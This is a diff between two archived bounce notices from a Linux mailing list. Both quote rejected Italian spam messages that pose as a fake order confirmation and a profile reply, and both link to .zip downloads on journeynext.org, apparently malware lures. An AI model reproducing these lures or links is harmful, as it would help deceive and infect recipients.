@@ -1,9 +1,9 @@
-From: MAILER-DAEMON-Cc/XG/tI2h8jO/d4LxdBO5Bk50Y0Ftjf@public.gmane.org (Mail Delivery System)
-Subject: Undelivered Mail Returned to Sender
-Date: Mon, 25 Mar 2013 11:46:50 +0100 (CET)
-Message-ID: <20130325104650.3130310013BF@pecfe5.pec.lombardia.it>
+From: Posta Certificata Legalmail <posta-certificata-uAB2pouQAuvkqfQpfK8e+Q@public.gmane.org>
+Subject: ERRORE: Messaggio rifiutato dal sistema
+Date: Mon, 25 Mar 2013 12:50:13 +0100 (CET)
+Message-ID: <27857.2543095381$1364215868@news.gmane.org>
 Mime-Version: 1.0
-Content-Type: multipart/mixed; boundary="===============0705287989486496648=="
+Content-Type: multipart/mixed; boundary="===============0879180249257417441=="
 Return-path: <containers-bounces-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
 List-Unsubscribe: <https://lists.linuxfoundation.org/mailman/options/containers>,
 	<mailto:containers-request-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org?subject=unsubscribe>
@@ -14,105 +14,85 @@ List-Subscribe: <https://lists.linuxfoundation.org/mailman/listinfo/containers>,
 	<mailto:containers-request-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org?subject=subscribe>
 Sender: containers-bounces-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
 Errors-To: containers-bounces-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
-To: containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
+To: OrderCo <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
 List-Id: containers.vger.kernel.org
 
-This is a MIME-encapsulated message.
-
---===============0705287989486496648==
+--===============0879180249257417441==
 Content-Type: multipart/report; report-type=delivery-status;
-	boundary="F2B2F10013B9.1364208410/pecfe5.pec.lombardia.it"
+	boundary="----=_Part_47367_16231726.1364212213670"
+
+------=_Part_47367_16231726.1364212213670
+Content-Type: text/plain; charset="ISO-8859-1"
 Content-Transfer-Encoding: 7bit
 
-This is a MIME-encapsulated message.
+Messaggio rifiutato dal sistema.
+Le caselle destinatarie di seguito indicate ricevono esclusivamente messaggi di posta elettronica certificata oppure sono caselle di servizio riservate al gestore:
 
---F2B2F10013B9.1364208410/pecfe5.pec.lombardia.it
-Content-Description: Notification
-Content-Type: text/plain; charset=us-ascii
-
-This is the mail system message.
-
-I'm sorry to have to inform you that your message could not
-be delivered to one or more recipients. It's attached below.
-
-                   The mail system
-
-<ia.comune.casnateconbernate-RwE6Ndc99cFLGcBWcxgnif9lYrnsuH/l@public.gmane.org>: host
-    10.11.49.139[10.11.49.139] said: 550 5.1.1
-    <ia.comune.casnateconbernate-RwE6Ndc99cFLGcBWcxgnif9lYrnsuH/l@public.gmane.org>: Recipient address
-    rejected: User unknown in virtual mailbox table (in reply to RCPT TO
-    command)
-
---F2B2F10013B9.1364208410/pecfe5.pec.lombardia.it
-Content-Description: Delivery report
+protocollo-xuxQSbes41GGzLJY+7CQzQ@public.gmane.org - casella che riceve solo Posta Certificata
+------=_Part_47367_16231726.1364212213670
 Content-Type: message/delivery-status
-
-Reporting-MTA: dns; pecfe5.pec.lombardia.it
-X-Postfix-Queue-ID: F2B2F10013B9
-X-Postfix-Sender: rfc822; containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
-Arrival-Date: Mon, 25 Mar 2013 11:46:49 +0100 (CET)
-
-Final-Recipient: rfc822; ia.comune.casnateconbernate-RwE6Ndc99cFLGcBWcxgnif9lYrnsuH/l@public.gmane.org
-Original-Recipient: rfc822;ia.comune.casnateconbernate-RwE6Ndc99cFLGcBWcxgnif9lYrnsuH/l@public.gmane.org
-Action: failed
-Status: 5.1.1
-Remote-MTA: dns; 10.11.49.139
-Diagnostic-Code: smtp; 550 5.1.1
-    <ia.comune.casnateconbernate-RwE6Ndc99cFLGcBWcxgnif9lYrnsuH/l@public.gmane.org>: Recipient address
-    rejected: User unknown in virtual mailbox table
-
---F2B2F10013B9.1364208410/pecfe5.pec.lombardia.it
-Content-Description: Undelivered Message
-Content-Type: message/rfc822
 Content-Transfer-Encoding: 7bit
 
-Return-Path: <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
-Received: from localhost (pecfe5-mx [10.11.49.139])
-	by pecfe5.pec.lombardia.it (Postfix) with ESMTP id F2B2F10013B9
-	for <ia.comune.casnateconbernate-RwE6Ndc99cFLGcBWcxgnif9lYrnsuH/l@public.gmane.org>; Mon, 25 Mar 2013 11:46:49 +0100 (CET)
-X-VirusFound: false
-X-Spam: Score=3.728
-X-Virus-Scanned: amavisd-new at telecompost.it
-Received: from pecfe5.pec.lombardia.it ([127.0.0.1])
-	by localhost (pecfe5.telecompost.it [127.0.0.1]) (amavisd-new, port 10025)
-	with ESMTP id qFhiIItlt0kH
-	for <ia.comune.casnateconbernate-RwE6Ndc99cFLGcBWcxgnif9lYrnsuH/l@public.gmane.org>;
-	Mon, 25 Mar 2013 11:46:49 +0100 (CET)
-Received: from custompcs.net.au (unknown [27.50.89.71])
-	by pecfe5.pec.lombardia.it (Postfix) with ESMTP id 3FD721001307
-	for <ia.comune.casnateconbernate-RwE6Ndc99cFLGcBWcxgnif9lYrnsuH/l@public.gmane.org>; Mon, 25 Mar 2013 11:46:42 +0100 (CET)
-Received: from [27.50.89.71] by custompcs.net.au id WUiukZIbQIqh with SMTP; Mon, 25 Mar 2013 06:46:41 -0400
-Date: Mon, 25 Mar 2013 06:46:41 -0400
+Reporting-MTA: dns; legalmail.it
+
+Final-Recipient: rfc822;protocollo-xuxQSbes41GGzLJY+7CQzQ@public.gmane.org
+Action: failed
+Status: 5.0.0 (casella che riceve solo Posta Certificata)
+
+------=_Part_47367_16231726.1364212213670
+Content-Type: message/rfc822
+
+Received: from SAU-71762-OR.sau.net.au (sau-55c56-or.sau.net.au [27.50.86.170] (may be forged))
+	by vlefpecsmtp001.dmz.infocert.it (8.14.5/8.14.5) with ESMTP id r2PBiivu001022
+	for <protocollo-xuxQSbes41GGzLJY+7CQzQ@public.gmane.org>; Mon, 25 Mar 2013 12:44:46 +0100
+Received: from [27.50.86.170] by SAU-71762-OR.sau.net.au id pU9ALk4OMSD3gl3R; Mon, 25 Mar 2013 22:44:44 +1100
+Message-ID: <004f01ce294e$22e5da80$0200a8c0-5X32oH+SWYHju/CiIO64j+23QSEHp/Li@public.gmane.org>
 From: "OrderCo" <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
-X-Mailer: The Bat! (v4.06.5) Personal
-X-Priority: 3 (Normal)
-Message-ID: <3128135263.85533408763050-tZDOFUKzIplqFZ3NbRY2NA@public.gmane.org>
-To: <ia.comune.casnateconbernate-RwE6Ndc99cFLGcBWcxgnif9lYrnsuH/l@public.gmane.org>
-Subject: Re: Monte Biz.
+To: <protocollo-xuxQSbes41GGzLJY+7CQzQ@public.gmane.org>
+Subject: Re: document 77999840
+Date: Mon, 25 Mar 2013 22:44:44 +1100
 MIME-Version: 1.0
 Content-Type: text/plain;
 	charset="windows-1252"
+X-Virus-Scanned: clamav-milter 0.97.4 at vlefpecsmtp001.dmz.infocert.it
+X-Virus-Status: Clean
+X-Brightmail-Tracker: AAAAAR1kMZo=
+X-BMI-Spam: spam
 Content-Transfer-Encoding: quoted-printable
 
 
+Buongiorno,=20
+   =20
 
-Gentile utente, Monte Biz=20
          =20
+Grazie per aver ordinate da Puremobile Inc.
+   =20
+Il questo messagio e solo da informarvi che il =20
+vostro ordine ero stato ricevuto ed attualmente=20
+e nel fase di elaborazione.       =20
+
+Il vostro riferimento di ordine e  6210.=20
+Avrete bisogno di questo in corrispondenza.=20
+Tale ricevuta non e prova di acquisto.=20
+Riceverete la fattura stampata via posta a indirizzo di fatturazione.=20
+
+Avete schelto la paga con la carta di credito.       =20
+      =20
+La carta verra addebitata a somma di 528.00 USD=20
+e "Puremobile Inc." apparira'  accanto alla tassa di vostra dichiarazione=
+.=20
+      =20
+L'informazione sul vostro acquisto appare sotto nel file.=20
+http://www.journeynext.org/Descrizione/Info.zip?ikPCyT9i=3Dprotocollo@pec=
+.unive.it
+
   =20
-La risposta alla tua domanda riguardo al profilo sul nostro sito web.
-  =20
-Statistiche       =20
-http://www.journeynext.org/Notare/InfoBlocco.zip?yJUMokzBmpmLA=3Dia.comun=
-e.casnateconbernate-RwE6Ndc99cFLGcBWcxgnif9lYrnsuH/l@public.gmane.org
-
-
-Id 829          .
 
 
 
---F2B2F10013B9.1364208410/pecfe5.pec.lombardia.it--
+------=_Part_47367_16231726.1364212213670--
 
---===============0705287989486496648==
+--===============0879180249257417441==
 Content-Type: text/plain; charset="us-ascii"
 MIME-Version: 1.0
 Content-Transfer-Encoding: 7bit
@@ -122,4 +102,4 @@ _______________________________________________
 Containers mailing list
 Containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
 https://lists.linuxfoundation.org/mailman/listinfo/containers
---===============0705287989486496648==--
+--===============0879180249257417441==--
